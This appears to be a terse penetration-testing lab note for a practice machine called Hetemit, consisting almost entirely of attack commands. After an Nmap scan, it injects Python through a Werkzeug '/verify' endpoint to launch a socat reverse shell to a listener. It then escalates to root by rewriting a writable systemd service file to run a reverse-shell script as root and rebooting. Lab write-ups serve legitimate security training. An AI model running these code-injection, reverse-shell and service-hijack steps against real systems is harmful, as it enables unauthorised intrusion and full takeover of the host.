# Hetemit
# date 19/8/2023
# ip 192.168.244.117


# Nmap
21/tcp    open  ftp         syn-ack vsftpd 3.0.3
22/tcp    open  ssh         syn-ack OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http        syn-ack Apache httpd 2.4.37 ((centos))
139/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
50000/tcp open  http        syn-ack Werkzeug httpd 1.0.1 (Python 3.6.8)



# Wekzeug (192.168.244.117:50000)
{'/generate', '/verify'}
curl -X POST http://192.168.244.117:50000/verify — data "code=2*2"
curl -X POST --data "code=os" http://192.168.244.117:50000/verify
# exploitation
nc -nvlp 80
 curl -X POST --data "code=os.system('socat TCP:192.168.45.174:80 EXEC:sh')" http://192.168.244.117:50000/verify

# priv esc
find /etc -type f -writable 2> /dev/null
sudo -l
cat /etc/systemd/system/pythonapp.service

Specifically, we modified the ExecStart and User lines, and removed the WorkingDirectory= line.

[cmeeks@hetemit ~]$ cat <<'EOT'> /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
ExecStart=/home/cmeeks/reverse.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOT




[cmeeks@hetemit ~]$ cat <<'EOT'> /home/cmeeks/reverse.sh
#!/bin/bash
socat TCP:192.168.118.8:18000 EXEC:sh
EOT

[cmeeks@hetemit ~]$ chmod +x /home/cmeeks/reverse.sh



 nc -lvnp 18000          

 sudo reboot